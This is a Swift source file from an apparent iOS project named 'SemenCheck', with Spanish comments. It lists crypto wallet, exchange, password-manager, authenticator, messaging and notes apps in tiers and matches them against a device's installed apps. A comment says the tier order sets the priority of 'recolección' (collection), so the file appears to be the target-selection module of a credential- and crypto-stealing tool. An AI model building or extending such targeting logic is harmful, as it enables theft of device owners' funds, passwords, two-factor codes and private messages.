//
//  Targets.swift
//  SemenCheck
//
//  Catálogo de apps que merece la pena revisar. Tier 1 son wallets propias,
//  tier 2 exchanges y gestores, tier 3 el resto. El orden marca la prioridad
//  de recolección.
//

import Foundation

struct TargetApp: Identifiable, Hashable {
    let bundleID: String
    let name: String
    let tier: Int

    var id: String { bundleID }
}

enum Targets {
    static let catalog: [TargetApp] = [
        // Wallets (tier 1)
        app("io.metamask.MetaMask", "MetaMask", 1),
        app("com.trustwallet.app", "Trust Wallet", 1),
        app("com.phantom.app", "Phantom", 1),
        app("com.coinbase.wallet", "Coinbase Wallet", 1),
        app("exodus-mobile.exodus", "Exodus", 1),
        app("io.imtoken.app", "imToken", 1),
        app("com.bitpie.wallet", "Bitpie", 1),
        app("vip.mytokenpocket", "TokenPocket", 1),
        app("com.mathwallet.ios", "MathWallet", 1),
        app("io.bluewallet.bluewallet", "BlueWallet", 1),
        app("com.solflare.mobile", "Solflare", 1),
        app("com.uniswap.mobile", "Uniswap", 1),
        app("com.rainbow.wallet", "Rainbow", 1),
        app("io.zerion.wallet", "Zerion", 1),
        app("com.safe.mobileapp", "Safe", 1),
        app("com.ledger.live", "Ledger Live", 1),
        app("com.tangem.wallet", "Tangem", 1),

        // Exchanges y gestión (tier 2)
        app("com.binance.dev", "Binance", 2),
        app("com.coinbase.consumer", "Coinbase", 2),
        app("io.kraken.Kraken", "Kraken", 2),
        app("com.okex.OKExAppstore", "OKX", 2),
        app("com.bybit.app", "Bybit", 2),
        app("com.bitget.exchange", "Bitget", 2),
        app("com.bitfinex.app", "Bitfinex", 2),
        app("com.kucoin.app", "KuCoin", 2),
        app("com.1password.1password", "1Password", 2),
        app("com.bitwarden.desktop", "Bitwarden", 2),
        app("com.strongbox.Strongbox", "Strongbox", 2),
        app("com.google.authenticator", "Google Authenticator", 2),

        // Resto (tier 3)
        app("ph.telegra.Telegraph", "Telegram", 3),
        app("net.whatsapp.WhatsApp", "WhatsApp", 3),
        app("com.apple.mobilenotes", "Notas", 3),
        app("com.apple.DocumentsApp", "Archivos", 3)
    ]

    static func app(_ bundleID: String, _ name: String, _ tier: Int) -> TargetApp {
        TargetApp(bundleID: bundleID, name: name, tier: tier)
    }

    /// Cruza las apps instaladas con el catálogo, ordenado por tier.
    static func match(installed: [[String: String]]) -> [TargetApp] {
        var byID: [String: String] = [:]
        for item in installed {
            if let id = item["bundleID"] { byID[id] = item["name"] }
        }
        return catalog
            .filter { byID[$0.bundleID] != nil }
            .map { entry in
                TargetApp(bundleID: entry.bundleID,
                          name: byID[entry.bundleID] ?? entry.name,
                          tier: entry.tier)
            }
            .sorted { $0.tier < $1.tier }
    }

    static func isWallet(_ bundleID: String) -> Bool {
        catalog.contains { $0.bundleID == bundleID && $0.tier <= 1 }
    }
}
